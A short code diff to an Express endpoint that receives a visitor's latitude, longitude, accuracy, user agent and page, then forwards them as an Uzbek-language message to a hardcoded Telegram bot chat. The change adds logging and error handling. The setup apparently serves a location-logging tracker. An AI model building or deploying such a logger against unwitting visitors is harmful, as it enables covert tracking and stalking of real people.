@@ -10,6 +10,7 @@ const CHAT_ID = "5399168630";
 app.post("/api/location", async (req, res) => {
   try {
     const { latitude, longitude, accuracy, page, userAgent, time } = req.body;
+    console.log("Received location request:", req.body);
 
     const text = `
 📍 Yangi joylashuv yuborildi
@@ -26,11 +27,18 @@ https://maps.google.com/?q=${latitude},${longitude}
 ⏰ Vaqt: ${time}
 `;
 
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: CHAT_ID, text })
     });
+
+    const telegramData = await telegramResponse.json();
+    console.log("Telegram response:", telegramData);
+
+    if (!telegramResponse.ok) {
+      throw new Error(`Telegram API error: ${telegramData.description || telegramResponse.statusText}`);
+    }
 
     res.json({ ok: true });
   } catch (error) {
